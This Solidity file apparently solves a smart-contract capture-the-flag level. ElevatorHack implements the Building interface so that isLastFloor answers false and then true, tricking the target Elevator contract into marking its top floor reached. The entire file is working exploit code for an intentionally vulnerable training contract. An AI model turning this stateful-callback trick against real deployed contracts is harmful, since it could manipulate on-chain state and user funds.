// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Building, Elevator} from "./Elevator.sol";

contract ElevatorHack is Building {
    uint8 private count;
    Elevator private elevator;

    constructor(address _elevator){
        elevator = Elevator(_elevator);
    }

    function attack() external {
        elevator.goTo(60);
    }

    function isLastFloor(uint256) external returns (bool) {
        count++;
        return count > 1;
    }
}
